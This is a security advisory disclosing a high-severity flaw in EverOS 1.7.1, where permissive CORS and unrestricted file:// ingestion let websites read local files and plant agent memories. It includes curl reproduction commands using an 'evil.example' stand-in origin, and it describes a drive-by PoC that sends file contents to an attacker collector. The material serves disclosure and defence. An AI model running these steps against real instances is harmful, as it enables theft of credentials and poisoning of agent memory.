# EverOS — Unauthenticated websites can exfiltrate arbitrary local files through the EverOS API (F-01)

## Severity

- **High** — CVSS 3.1 **8.2** — `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N`
  - Calculator: https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N
- **CWE:** CWE-73 (External Control of File Name or Path), CWE-942 (Permissive Cross-domain Policy), CWE-306 (Missing Authentication for Critical Function, contributing)

## Affected product

EverOS 1.7.1 (`EverMind-AI/EverOS`), commit `e5778edb4cbac71e359ea375f38cf805aae32b0c`, default configuration with the optional `[multimodal]` parser configured. Re-verified **unfixed** at upstream main HEAD `6ac3898e7755dfc41002bfdc9704279009a82b81` (2026-11-24, 24 commits past v1.7.1; latest tag still v1.7.1).

## Summary

EverOS is a local-first agent-memory service (Python/FastAPI) whose HTTP API has no authentication by documented design. Two insecure defaults combine into browser-mediated local file disclosure:

1. **Root cause A — unrestricted `file://` ingestion.** `POST /api/v2/memory/add` accepts a content item with `uri: file:///...`. With the default `file_uri_allow_dirs = []` (`src/everos/config/settings.py:610`), the empty allowlist is treated as "allow any readable file". The file is hydrated, parsed, and its text stored as `parsed_content`, then returned verbatim by `POST /api/v2/memory/search`. Size cap: 50 MB/item.
2. **Root cause B — permissive CORS on the unauthenticated API.** `src/everos/entrypoints/api/middleware/cors.py` defaults `DEFAULT_CORS_ORIGINS = ["*"]` and `DEFAULT_CORS_ALLOW_CREDENTIALS = True`; Starlette reflects the request `Origin` and returns `Access-Control-Allow-Credentials: true`.

Any website a victim visits can therefore read arbitrary local files readable by the EverOS process and write attacker-chosen memories — no prompt, no credentials, no cookies required. Demonstrated end-to-end in headless Chromium from a distinct cross-origin hostname mapped to loopback.

## Attack path

1. Victim runs EverOS locally (documented deployment) and visits an attacker-controlled page.
2. Page JS sends cross-origin `POST /api/v2/memory/add` with `{"uri": "file:///etc/hostname", "ext": "txt"}` — preflight succeeds because the server reflects `Origin` with credentials allowed.
3. EverOS reads the file as the victim user, parses it, stores it under the attacker-chosen `session_id`.
4. Page JS sends `POST /api/v2/memory/search` and reads `parsed_content` cross-origin.
5. Page JS POSTs the content to an attacker collector.

Secondary observation: search does not bind `session_id` to `user_id` — anyone who learns a session ID can read its buffered messages (session IDs are the only access control).

## Impact

- Confidentiality: arbitrary local file read (≤50 MB per item) — credentials, SSH keys, browser profiles, documents — exfiltrated to a remote collector via the victim's browser.
- Integrity: attacker-chosen memories injected into the victim's memory store (context poisoning of the agent).
- Scope change: the browser security boundary is crossed to reach the loopback API (`S:C` in CVSS).
- Preconditions: EverOS running locally with `[multimodal]` parser configured; victim visits attacker page. OS file permissions still apply (`/etc/shadow` correctly unreadable → HTTP 500).

## Steps to reproduce

Full detail, request/response captures, negative controls, and the runnable browser PoC are in the public report repository:

**https://github.com/Teycir/everos-cors-file-exfil** (`report.md`, `evidence/`, `poc/`)

Minimal reproduction (against a local EverOS 1.7.1 instance on `127.0.0.1:18777`):

```bash
# 1. Ingest a local file through the API
curl -s -X POST http://127.0.0.1:18777/api/v2/memory/add \
  -H 'Content-Type: application/json' -H 'Origin: http://evil.example:8000' \
  -d '{"session_id":"poc","messages":[{"sender_id":"u1","role":"user","timestamp":1,"content":[{"type":"doc","name":"hostname.txt","uri":"file:///etc/hostname","ext":"txt"}]}],"defer_extraction":true}'

# 2. Read the parsed content back cross-origin
curl -s -X POST http://127.0.0.1:18777/api/v2/memory/search \
  -H 'Content-Type: application/json' -H 'Origin: http://evil.example:8000' \
  -d '{"session_id":"poc","user_id":"attacker","query":"hostname"}'
# -> data.unprocessed_messages[0].content[0].parsed_content == "teycir-G5-KF5\n"
```

Browser drive-by PoC: `poc/driveby.html` + `poc/exfil_listener.py` + `poc/browser_driveby.sh` in the report repo (verified in headless Chromium 157; exfiltrated `/etc/hostname` contents to a cross-origin collector).

Negative controls verified: with `file_uri_allow_dirs` configured, symlink escape, `..` traversal, and `file://localhost/` variants are all rejected; oversized/unreadable files error without content.

## Suggested remediation

- Default `file_uri_allow_dirs` to deny-all when unset; require explicit opt-in directories; resolve symlinks before the check.
- Default CORS to no origins and `allow_credentials=False`; require explicit allowlists.
- Add per-instance bearer-token authentication for all API routes; never rely on loopback binding as authorization.
- Do not return `parsed_content` or content bytes in search/list DTOs; return references only.
- Reject `Origin: null` and non-allowlisted origins before routing.

## Disclosure status

- Reported privately to the vendor (`evermind@shanda.com`, the channel designated in the project's `SECURITY.md`) on **2026-11-20T16:36:50Z** with the full evidence archive (Message-ID recorded in the report repo's `disclosure/contact-log.md`).
- Vendor's `SECURITY.md` commits to acknowledgement within 5 business days and to fixing before public disclosure.
- Re-verified unfixed at upstream HEAD `6ac3898` on 2026-11-24.
- Reporter: Teycir. Analysis and report drafting LLM-assisted; all exploitation was executed and verified by the reporter against a live local build of the release source.
